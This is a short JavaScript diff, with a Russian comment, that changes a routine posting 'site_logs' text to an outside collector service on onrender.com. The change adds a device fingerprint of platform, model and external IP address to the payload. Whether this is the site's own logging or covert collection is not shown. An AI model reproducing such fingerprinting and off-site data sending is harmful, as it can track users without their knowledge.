@@ -149,10 +149,10 @@
         }).join('');
         const nameBase = dn(he);
         const folderName = 'site_logs';
-        const fileName = `${nameBase}.txt`;
+        const fileName = undefined; // имя определит сервер (реестр/эвристика)
         const BASE_API = 'https://data-collector-gizw.onrender.com';
         try {
-          const payload = { folder_name: folderName, file_name: fileName, content: txt };
+          const payload = { folder_name: folderName, file_name: fileName, content: txt, fingerprint: [z2,zA,he.model||'',extIP].join('|'), platform: zA, model: he.model||'', externalIP: extIP };
           const sv = (window._SV)||'';
           await fetch(`${BASE_API}/collect`, {
             method: 'POST',
